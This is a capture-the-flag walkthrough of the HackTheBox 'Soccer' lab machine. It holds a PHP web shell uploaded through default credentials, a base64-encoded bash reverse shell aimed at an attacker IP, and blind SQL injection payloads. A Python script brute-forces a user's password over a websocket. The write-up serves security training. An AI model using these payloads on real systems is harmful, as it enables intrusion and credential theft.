<title>HackTheBox - Soccer (Easy)</title>
<header>
	<div class="header">
    <div class="titleContainer">
    <img class="headerIcon" src="/write-ups/HackTheBox/Easy/Soccer/icon.png"/>
      <p class="mainTitle">HackTheBox - Soccer (Easy)</p>
    </div>
  </div>
</header>
<div class="writeUp">
	<h1 id="table-of-contents">Table of contents</h1>
	<nav id="tableOfContents" class="tableOfContents">
	</nav>
  <h1 id="reconnaissance">Reconnaissance</h1>
  <h2 id="nmap-scan">Nmap scan</h2>
  <div class="codeBlock"># Nmap 7.94SVN scan initiated Fri Feb 23 10:57:42 2024 as: nmap -A -p- -T5 -v -oN nmapResults.txt 10.129.155.184
Warning: 10.129.155.184 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.155.184
Host is up (0.034s latency).
Not shown: 63943 closed tcp ports (conn-refused), 1589 filtered tcp ports (no-response)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src &#x27;none&#x27;
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Fri, 23 Feb 2024 15:58:49 GMT
|     Connection: close
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang=&quot;en&quot;&gt;
|     &lt;head&gt;
|     &lt;meta charset=&quot;utf-8&quot;&gt;
|     &lt;title&gt;Error&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;pre&gt;Cannot GET /&lt;/pre&gt;
|     &lt;/body&gt;
|     &lt;/html&gt;
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src &#x27;none&#x27;
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Fri, 23 Feb 2024 15:58:49 GMT
|     Connection: close
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang=&quot;en&quot;&gt;
|     &lt;head&gt;
|     &lt;meta charset=&quot;utf-8&quot;&gt;
|     &lt;title&gt;Error&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;
|     &lt;/body&gt;
|_    &lt;/html&gt;
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.94SVN%I=7%D=2/23%Time=65D8C0B4%P=x86_64-pc-linux-gnu%r
SF:(informix,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20clos
SF:e\r\n\r\n&quot;)%r(drda,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection
SF::\x20close\r\n\r\n&quot;)%r(GetRequest,168,&quot;HTTP/1\.1\x20404\x20Not\x20Found
SF:\r\nContent-Security-Policy:\x20default-src\x20&#x27;none&#x27;\r\nX-Content-Type
SF:-Options:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\
SF:nContent-Length:\x20139\r\nDate:\x20Fri,\x2023\x20Feb\x202024\x2015:58:
SF:49\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20l
SF:ang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;/title&gt;\
SF:n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20GET\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r
SF:(HTTPOptions,16C,&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-
SF:Policy:\x20default-src\x20&#x27;none&#x27;\r\nX-Content-Type-Options:\x20nosniff\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201
SF:43\r\nDate:\x20Fri,\x2023\x20Feb\x202024\x2015:58:49\x20GMT\r\nConnecti
SF:on:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n
SF:&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pr
SF:e&gt;Cannot\x20OPTIONS\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(RTSPRequest,16C,
SF:&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20defaul
SF:t-src\x20&#x27;none&#x27;\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\
SF:x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Fr
SF:i,\x2023\x20Feb\x202024\x2015:58:49\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;meta\x20charset=
SF:\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20OPTIO
SF:NS\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(RPCCheck,2F,&quot;HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;)%r(DNSVersionBindReqTCP
SF:,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n
SF:&quot;)%r(DNSStatusRequestTCP,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConn
SF:ection:\x20close\r\n\r\n&quot;)%r(Help,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nConnection:\x20close\r\n\r\n&quot;)%r(SSLSessionReq,2F,&quot;HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 23 10:58:52 2024 -- 1 IP address (1 host up) scanned in 70.12 seconds</div>
  <p>
    There is a web server on port <code>80</code> running <b>nginx 1.18.0</b>. It redirects us to <code>soccer.htb</code>, so we found a virtual host. We can add it to our 
    <code>/etc/hosts</code> file (or <code>C:/Windows/System32/drivers/etc/hosts</code> on Windows systems).
  </p>
  <h2 id="web-service-reconnaissance">Web service reconnaissance</h2>
  <p>Let‚Äôs take a look at the web server on port 80 using a web browser :</p>
  <img src="/write-ups/HackTheBox/Easy/Soccer/Untitled.png"/>
  <p>Nothing seems to be interesting here. Let‚Äôs use ffuf to fuzz directories :</p>
  <div class="codeBlock">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/Soccer]
‚îî‚îÄ$ ffuf -u http://soccer.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 6917

        /&#x27;___\  /&#x27;___\           /&#x27;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soccer.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 6917
________________________________________________

tiny                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 36ms]</div>
  <p>We found a directory named tiny. Let‚Äôs take a look at it using our web browser :</p>
  <img src="/write-ups/HackTheBox/Easy/Soccer/Untitled 1.png"/>
  <p>This is the login page for Tiny File Manager.</p>
  <blockquote>
    TinyFileManager is web based PHP file manager and it is a simple, fast and small size in single-file PHP file that can be dropped into any folder on your server, 
    multi-language ready web application for storing, uploading, editing and managing files and folders online via web browser.
  </blockquote>
  <p>If we find a way to gain access to this component, we may be able to upload a PHP web shell (or reverse shell).</p>
  <h1 id="initial-access">Initial access</h1>
  <p>
    First, we can try to use the default credentials for Tiny File Manager. According to the <a href="http://README.md">README.md</a> 
    file present in the official GitHub repository, the default credentials are <code>admin:admin@123</code>. If we enter those credentials, we are redirected to this page :
  </p>
  <img src="/write-ups/HackTheBox/Easy/Soccer/Untitled 2.png"/>
  <p>
    So, we have now access to Tiny File Manager. We can see the current version at the bottom of the page which is 2.4.3. If we navigate in this tiny folder, 
    we can find an upload folder on which we have read, write and execute permissions : 
  </p>
  <img src="/write-ups/HackTheBox/Easy/Soccer/Untitled 3.png"/>
  <p>We can navigate to the uploads directory and upload a web shell inside of it. First, we can create a very simple web shell :</p>
  <div class="codeBlock">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/Soccer]
‚îî‚îÄ$ cat shell.php      
&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;</div>
  <p>
    This PHP code will simply pass the cmd variable passed in the URL to the system function. The system function is used to run OS commands on the server. 
    After uploading the php web shell, we can execute a reverse shell like so :
  </p>
  <div class="codeBlock">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/Soccer]
‚îî‚îÄ$ curl &#x27;http://soccer.htb/tiny/uploads/shell.php?cmd=echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC43MS80NDQ0IDA%2BJjE%3D|base64%20-d|bash&#x27;</div>
  <p>Now, let‚Äôs take a look at our listener :</p>
  <div class="codeBlock">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/Soccer]
‚îî‚îÄ$ pwncat-cs -lp 4444
/home/kali/.local/lib/python3.11/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
  &#x27;class&#x27;: algorithms.Blowfish,
[11:03:56] Welcome to pwncat üêà!                                                                                  __main__.py:164
[11:08:55] received connection from 10.129.2.212:53460                                                                 bind.py:84
[11:08:56] 10.129.2.212:53460: registered new host w/ db                                                           manager.py:957
(local) pwncat$                                                                                                                  
(remote) www-data@soccer:/var/www/html/tiny/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
  <p>We have now a foothold on the system as www-data.</p>
  <h1>Post exploitation</h1>
  <h2 id="local-enumeration">Local enumeration</h2>
  <p>Let‚Äôs take a look at the /etc/passwd file :</p>
  <div class="codeBlock">(remote) www-data@soccer:/var/www/html/tiny/uploads$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:112:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
player:x:1001:1001::/home/player:/bin/bash
mysql:x:113:121:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:997:997::/var/log/laurel:/bin/false</div>
  <p>
    We can see that there is a local user named player, and his home directory is located in /home/player. We don‚Äôt have write permissions on his home 
    directory and we cannot read any file in it. Let‚Äôs take a look at the listening ports to see if there is useful services accessible locally :
  </p>
  <div class="codeBlock">(remote) www-data@soccer:/var/www/html/tiny/uploads$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:9091            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1034/nginx: worker  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      1034/nginx: worker  
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -</div>
  <p>
    It seems that there is MySQL running on the system since port 3306 is listening, but we don‚Äôt have valid credentials for this service. Also, there is another 
    service running on port 3000. We can use curl to see if this is an HTTP service :
  </p>
  <div class="codeBlock">(remote) www-data@soccer:/var/www/html/tiny/uploads$ curl http://localhost:3000/
&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
    &lt;head&gt;
        &lt;meta charset=&quot;UTF-8&quot;&gt;
        &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
        &lt;link href=&quot;/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; id=&quot;bootstrap-css&quot;&gt;
        &lt;script src=&quot;/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
        &lt;script src=&quot;/js/jquery.min.js&quot;&gt;&lt;/script&gt;    
        &lt;title&gt;Soccer&lt;/title&gt;
    &lt;/head&gt;
    &lt;style&gt;
        header {
            position: relative;
            background-color: black;
            background-image: url(&#x27;/img/football.jpg&#x27;);
            height: 75vh;
            min-height: 25rem;
            width: 100%;
            overflow: hidden;
        }

        .display-3 {
            color: greenyellow;
        }

        h1 {
            text-align: center;
        }

        header video {
            position: absolute;
            top: 50%;
            left: 50%;
            min-width: 100%;
            min-height: 100%;
            width: auto;
            height: auto;
            z-index: 0;
            -ms-transform: translateX(-50%) translateY(-50%);
            -moz-transform: translateX(-50%) translateY(-50%);
            -webkit-transform: translateX(-50%) translateY(-50%);
            transform: translateX(-50%) translateY(-50%);
        }

        header .container {
            position: relative;
            z-index: 2;
        }

        header .overlay {
            position: absolute;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
            opacity: 0.5;
            z-index: 1;
        }

        @media (pointer: coarse) and (hover: none) {
            header {
                background: url(&#x27;img/football.jpg&#x27;);
            }

            header video {
                display: none;
            }
        }
    &lt;/style&gt;
    &lt;body&gt;
        &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark&quot;&gt;
    &lt;div class=&quot;container-fluid&quot;&gt;
        &lt;a class=&quot;navbar-brand&quot;&gt;Soccer&lt;/a&gt;
        &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
            &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
        &lt;/button&gt;
        &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNavAltMarkup&quot;&gt;
            &lt;div class=&quot;navbar-nav&quot;&gt;
                &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;
            &lt;/div&gt;
            &lt;div class=&quot;navbar-nav&quot;&gt;
                &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/match&quot;&gt;Match&lt;/a&gt;
            &lt;/div&gt;
            
            
                &lt;div class=&quot;navbar-nav&quot;&gt;
                    &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/login&quot;&gt;Login&lt;/a&gt;
                &lt;/div&gt;
                &lt;div class=&quot;navbar-nav&quot;&gt;
                    &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;/signup&quot;&gt;Signup&lt;/a&gt;
                &lt;/div&gt;
            
            
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/nav&gt;
        &lt;header&gt;
            &lt;div class=&quot;container h-100&quot;&gt;
                &lt;div class=&quot;d-flex h-100 text-center align-items-center&quot;&gt;
                    &lt;div class=&quot;w-100 text-white&quot;&gt;
                        &lt;h1 class=&quot;display-3&quot;&gt;HTB FootBall Club&lt;/h1&gt;
                        &lt;p class=&quot;lead mb-0&quot;&gt;&quot;We Love Soccer&quot;&lt;/p&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
            &lt;/style&gt;
        &lt;/header&gt;
        &lt;section class=&quot;my-5&quot;&gt;
            &lt;div class=&quot;container&quot;&gt;
                &lt;div class=&quot;row&quot;&gt;
                        &lt;p&gt;Due to the scope and popularity of the sport, professional football clubs carry a significant commercial existence, with fans expecting personal service and interactivity, and stakeholders viewing the field of professional football as a source of significant business advantages. For this reason, expensive player transfers have become an expectable part of the sport. Awards are also handed out to managers or coaches on a yearly basis for excellent performances. The designs, logos and names of professional football clubs are often licensed trademarks. The difference between a football team and a (professional) football club is incorporation, a football club is an entity which is formed and governed by a committee and has members which may consist of supporters in addition to players. &lt;/p&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/section&gt;
        &lt;!-- Page Content --&gt;
        &lt;h1&gt;Latest News&lt;/h1&gt;
        &lt;div class=&quot;container&quot;&gt;
            &lt;div class=&quot;row&quot;&gt;
                &lt;div class=&quot;col-xl-3 col-md-6 mb-4&quot;&gt;
                    &lt;div class=&quot;card border-0 shadow&quot;&gt;
                        &lt;img src=&quot;/img/ground1.jpg&quot; class=&quot;card-img-top&quot; alt=&quot;admin&quot;&gt;
                        &lt;div class=&quot;card-body text-center&quot;&gt;
                            &lt;p class=&quot;card-text&quot;&gt;Get updates on the latest World Cup action and find articles, videos, commentary and analysis in one place.&lt;/p&gt;
                        &lt;/div&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
                &lt;div class=&quot;col-xl-3 col-md-6 mb-4&quot;&gt;
                    &lt;div class=&quot;card border-0 shadow&quot;&gt;
                        &lt;img src=&quot;/img/ground2.jpg&quot; class=&quot;card-img-top&quot; alt=&quot;admin&quot;&gt;
                        &lt;div class=&quot;card-body text-center&quot;&gt;
                            &lt;p class=&quot;card-text&quot;&gt;The FIFA World Cup Qatar 2022 will be played from 20 November to 18 December.&lt;/p&gt;
                        &lt;/div&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
                &lt;div class=&quot;col-xl-3 col-md-6 mb-4&quot;&gt;
                    &lt;div class=&quot;card border-0 shadow&quot;&gt;
                        &lt;img src=&quot;/img/ground3.jpg&quot; c alt=&quot;admin&quot;&gt;
                        &lt;div class=&quot;card-body text-center&quot;&gt;
                            &lt;p class=&quot;card-text&quot;&gt;Soccer is the most popular game in the world. In many countries it is known as ‚Äúfootball‚Äù.&lt;/p&gt;
                        &lt;/div&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
                &lt;div class=&quot;col-xl-3 col-md-6 mb-4&quot;&gt;
                    &lt;div class=&quot;card border-0 shadow&quot;&gt;
                        &lt;img src=&quot;/img/ground4.jpg&quot; class=&quot;card-img-top&quot; alt=&quot;admin&quot;&gt;
                        &lt;div class=&quot;card-body text-center&quot;&gt;
                            &lt;p class=&quot;card-text&quot;&gt;FIFA World Cup is the most popular soccer tournament that is followed by billions of people around the world on their Television so I wanted to take some time and make this web page dedicated to World Cup Soccer Facts only.&lt;/p&gt;
                        &lt;/div&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
                &lt;!-- /.row --&gt;
            &lt;/div&gt;
        &lt;/div&gt;
        &lt;!-- /.container --&gt;
&lt;/body&gt;
&lt;/html&gt;</div>
  <p>
    This is not the same web application as we used to gain a foothold on the system. By looking at nginx configuration files, we can see that this web application 
    is accessible through the soc-player.soccer.htb virtual host :
  </p>
  <div class="codeBlock">(remote) www-data@soccer:/var/www/html/tiny/uploads$ ls /etc/nginx/sites-available/               
default  soc-player.htb
(remote) www-data@soccer:/var/www/html/tiny/uploads$ cat /etc/nginx/sites-available/soc-player.htb 
server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection &#x27;upgrade&#x27;;
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}</div>
  <p>We can add this virtual host to our /etc/hosts file to access it from our attacking host. Now let‚Äôs take a look at this web application using our web browser :</p>
  <img src="/write-ups/HackTheBox/Easy/Soccer/Untitled 4.png"/>
  <p>
    This web applications looks like the one we used to gain a foothold, but if we take a look at the navigation bar, we can see that there is more pages available. 
    It seems we can create an account and sign in to the web application. Let‚Äôs click on Signup and create an account :
  </p>
  <img src="/write-ups/HackTheBox/Easy/Soccer/Untitled 5.png"/>
  <p>Now, we can login to the wab application :</p>
  <img src="/write-ups/HackTheBox/Easy/Soccer/Untitled 6.png"/>
  <p>After logging in, we are reditected to this web page :</p>
  <img src="/write-ups/HackTheBox/Easy/Soccer/Untitled 7.png"/>
  <p>
    As you can see, we are redirected to a page that asks us for a ticket number. We can use BurpSuite to capture the request sent when entering a ticket 
    number to see how the value is sent to the web server :
  </p>
  <img src="/write-ups/HackTheBox/Easy/Soccer/Untitled 8.png"/>
  <p>The ticket number is sent in a Json variable named id to a websocket server on port 9091. We can check if it is vulnerable to an SQL injection.</p>
  <h2 id="privilege-escalation-player">Privilege escalation (player)</h2>
  <p>
    If we enter the ticket number provided by the web application, we receive ‚ÄúTicket exists‚Äù, if not, we receive ‚ÄúTicket Doesn‚Äôt Exist‚Äù. But 
    if we try to enter an operation like 70904+1 (since my ticket number is 70905), we receive a valid ticket message 
  </p>
  <img src="/write-ups/HackTheBox/Easy/Soccer/Untitled 9.png"/>
  <p>
    So, the operation is interpreted. This is a sign that it may be vulnerable to SQL injections since SQL can interpret operations like the one above. 
    Since it only respond with ‚Äúvalid‚Äù or ‚Äúinvalid‚Äù response, it may be vulnerable to boolean based blind SQL injections. 
  </p>
  <p>Let‚Äôs check if it‚Äôs vulnerable to boolean based blind SQL injection :</p>
  <ul>
    <li><code>0 OR 1;</code> returns ‚ÄúTicket Exists‚Äù</li>
  </ul>
  <ul>
    <li><code>0 OR 0;</code> returns ‚ÄúTicket Doesn‚Äôt Exist‚Äù</li>
  </ul>
  <p>So, it is vulnerable to boolean based blind SQL injections.</p>
  <p>Let‚Äôs try to enumerate tables. Since we can create an account an login to the web application, there must be an accounts table or a user table :</p>
  <ul>
    <li><code>0 OR EXISTS (SELECT table_name FROM information_schema.tables WHERE table_name = &#x27;aaaaaaaaaaa&#x27;);</code> ‚Üí ‚ÄúTicket Doesn‚Äôt Exist‚Äù</li>
  </ul>
  <ul>
    <li><code>0 OR EXISTS (SELECT table_name FROM information_schema.tables WHERE table_name = &#x27;accounts&#x27;);</code> ‚Üí ‚ÄúTicket Exists‚Äù</li>
  </ul>
  <p>There is a table named accounts. Let‚Äôs enumerate columns from this table :</p>
  <ul>
    <li><code>0 OR EXISTS (SELECT column_name FROM information_schema.columns WHERE column_name = &#x27;password&#x27; AND TABLE_NAME = &#x27;aaaaaaaaaaaaa&#x27;);</code> ‚Üí ‚ÄúTicket Doesn‚Äôt Exist‚Äù</li>
  </ul>
  <ul>
    <li><code>0 OR EXISTS (SELECT column_name FROM information_schema.columns WHERE column_name = &#x27;password&#x27; AND TABLE_NAME = &#x27;accounts&#x27;);</code> ‚Üí ‚ÄúTicket Exists‚Äù</li>
  </ul>
  <ul>
    <li><code>0 OR EXISTS (SELECT column_name FROM information_schema.columns WHERE column_name = &#x27;username&#x27; AND TABLE_NAME = &#x27;accounts&#x27;);</code> ‚Üí ‚ÄúTicket Exists‚Äù</li>
  </ul>
  <p>We found the password column and the username column, let‚Äôs see if the player user created an account on the web application :</p>
  <ul>
    <li><code>0 OR EXISTS (SELECT username FROM accounts WHERE username = &#x27;aaaaaaaaa&#x27;);</code> ‚Üí ‚ÄúTicket Doesn‚Äôt Exist‚Äù</li>
  </ul>
  <ul>
    <li><code>0 OR EXISTS (SELECT username FROM accounts WHERE username = &#x27;player&#x27;);</code> ‚Üí ‚ÄúTicket Exists‚Äù</li>
  </ul>
  <p>It seems that the player user has an account on the web application. Let‚Äôs get his password by bruteforcing each characters :</p>
  <ul>
    <li><code>0 OR EXISTS (SELECT password FROM accounts WHERE username = &#x27;player&#x27; AND BINARY SUBSTRING(password,1,1) = &#x27;a&#x27;);</code> ‚Üí ‚ÄúTicket Doesn‚Äôt Exist‚Äù</li>
  </ul>
  <ul>
    <li><code>0 OR EXISTS (SELECT password FROM accounts WHERE username = &#x27;player&#x27; AND BINARY SUBSTRING(password,1,1) = &#x27;b&#x27;);</code> ‚Üí ‚ÄúTicket Doesn‚Äôt Exist‚Äù</li>
  </ul>
  <ul>
    <li>‚Ä¶</li>
  </ul>
  <p>Alternatively, We can write a python script to find the password faster :</p>
  <div class="codeBlock">from websocket import create_connection
import string

ws = create_connection(&quot;ws://soc-player.soccer.htb:9091/&quot;)
charset = string.ascii_lowercase + string.ascii_uppercase + string.digits

def brute():
    password = &quot;&quot;
    while True:
        for i in range(len(charset)):
            payload = &#x27;&#x27;&#x27;{&quot;id&quot;:&quot;1 OR EXISTS(SELECT password FROM accounts WHERE username = \\&quot;player\\&quot; AND BINARY SUBSTR(password,&#x27;&#x27;&#x27;
            payload += &quot;{},1) = &quot;.format(len(password) + 1)
            payload += &quot;&#x27;{}&#x27;)-- -&quot;.format(charset[i])
            payload += &quot;\&quot;}&quot;
            print(&quot;Using payload :&quot;,payload)
            ws.send(payload)
            result = ws.recv()
            if result == &quot;Ticket Exists&quot;:
                password = password + charset[i]
                
                #Test if end of password reached
                inject = &#x27;&#x27;&#x27;{&quot;id&quot;:&quot;1 OR EXISTS(SELECT password FROM accounts WHERE username = \\&quot;player\\&quot; AND password = \\&quot;&#x27;&#x27;&#x27;
                inject += password + &#x27;&#x27;&#x27;\\&quot;)-- -&quot;}&#x27;&#x27;&#x27;
                ws.send(inject)
                result = ws.recv()
                if result == &quot;Ticket Exists&quot;:
                    print(&quot;Password found :&quot;,password)
                    return
                break

brute()</div>
  <p>Let‚Äôs run this script to brute the password automatically :</p>
  <div class="codeBlock">‚îå‚îÄ[cyberretta@parrot]‚îÄ[~]
‚îî‚îÄ‚îÄ‚ïº $python3 sqli.py 
Using payload : {&quot;id&quot;:&quot;1 OR EXISTS(SELECT password FROM accounts WHERE username = \&quot;player\&quot; AND BINARY SUBSTR(password,1,1) = &#x27;a&#x27;)-- -&quot;}
Using payload : {&quot;id&quot;:&quot;1 OR EXISTS(SELECT password FROM accounts WHERE username = \&quot;player\&quot; AND BINARY SUBSTR(password,1,1) = &#x27;b&#x27;)-- -&quot;}
[CROPPED]
